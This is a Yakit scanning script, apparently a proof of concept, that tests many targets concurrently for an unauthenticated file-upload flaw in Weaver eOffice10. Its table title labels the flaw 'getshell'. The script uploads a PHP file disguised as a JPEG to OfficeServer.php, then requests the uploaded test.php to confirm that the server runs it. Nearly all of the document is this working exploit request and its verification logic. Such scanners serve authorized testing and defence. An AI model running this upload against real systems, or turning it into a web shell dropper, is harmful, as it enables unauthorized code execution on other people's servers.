yakit.AutoInitYakit()

yakit.EnableTable("泛微eoffice10前台getshell检测结果", ["目标URL", "是否存在漏洞"])

targets = cli.String("targets") 
targets = str.Split(targets, "\n") 
proxy = cli.String("proxy")
threads = cli.Int("threads")
cli.check()

def POC(target){
ip, port, err := str.ParseStringToHostPort(target)
if err != "" {
    yakit.Info("[-] IP和端口提取失败,失败原因：%v",err)
}
host := str.HostPort(ip, port)
if proxy == "" {
    rsp, req, err := poc.HTTP(`
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: {{param(target)}}
Content-Length: 374
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

<?php echo md5(1);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
`, poc.params({
    "target": host,
}))
}else{
    rsp, req, err := poc.HTTP(`
POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
Host: {{param(target)}}
Content-Length: 374
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FileData"; filename="1.jpg"
Content-Type: image/jpeg

<?php echo md5(1);?>
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs
Content-Disposition: form-data; name="FormData"

{'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
------WebKitFormBoundaryJjb5ZAJOOXO7fwjs--
`, poc.params({
    "target": host,
}),poc.proxy(proxy))
}

if err != "" {
    yakit.Info("[-] 目标%v 访问失败",target)
}else{
     yakit.Info("[+] 目标%v 访问成功",target)
}

poc_url := "http://" + host + "/eoffice10/server/public/iWebOffice2015/Document/test.php"
rsp_shell, err := http.NewRequest("GET", poc_url)
if err != "" {
    yakit.Info("[-] 目标路径%v 访问失败",poc_url)
}

resp_r0, _ := http.Do(rsp_shell)
bresp,_ := http.dump(resp_r0)
header, body = poc.Split(bresp)
flag := false
if string(body) == "c4ca4238a0b923820dcc509a6f75849b" {
    yakit.Info("[+] 目标%v 存在漏洞",target)
    flag := true
    result_out(target,flag)
}else{
    yakit.Info("[-] 目标%v 不存在漏洞",target)
    result_out(target,flag)
}
}

def result_out(url,flag){
    data := make(map[string]var)
    data["目标URL"] = url
    if flag {
        data["是否存在漏洞"] = "可能存在漏洞"
    }else{
        data["是否存在漏洞"] = "不存在漏洞"
    }
    yakit.Output(yakit.TableData("泛微eoffice10前台getshell检测结果", data))
}

def threadstask(url){
        swg.Add()
        go fn{
            defer swg.Done()
            POC(url)
        }
}

swg = sync.NewSizedWaitGroup(threads)
for _,url = range targets{
    threadstask(url) 
}
swg.Wait()
